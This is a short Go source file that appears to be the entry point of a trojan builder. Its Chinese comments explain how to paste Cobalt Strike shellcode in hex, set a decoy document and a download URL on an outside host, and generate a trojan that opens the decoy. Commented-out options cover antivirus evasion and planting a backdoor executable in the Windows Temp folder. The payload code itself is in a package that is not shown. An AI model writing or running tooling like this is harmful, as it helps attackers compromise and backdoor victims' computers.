package main

import "Blake_control/generate"

const (
	//将cs生成的C的shellcode转变成hex字符串，把\x全部替换成空字符即可
	shellcode_hex = "xxxxxx"
	//下载的文件存放处和打开文件路径
	//也可以填写url（执行木马后打开url）
	path = "C:\\Windows\\Temp\\xxx.doc"
	//path = "https://wx.qq.com/"
	//下载文件的url
	url = "http://xxxx.com/1.doc"

	//------------------------------------测试状态---------------------------------------------------------//
	//免杀下载地址
	//url1 = ""
	//后门木马文件存放地址
	//path1 = "C:\\Windows\\Temp\\test.exe"
)

//main方法
func main() {

	//生成木马弹出文件
	generate.Tnuma(shellcode_hex, url, path)

	//------------------------------------测试状态------------------------------------------------------//

	//只生成木马
	//generate.Onlymuma(shellcode_hex)

	//目前还在测试阶段
	//只植入后门
	//generate.Onlybackdoor(url1, path1)
	//生成木马弹出文件植入后门
	//generate.MTZmuma(shellcode_hex,url, path, url1, path1)
}
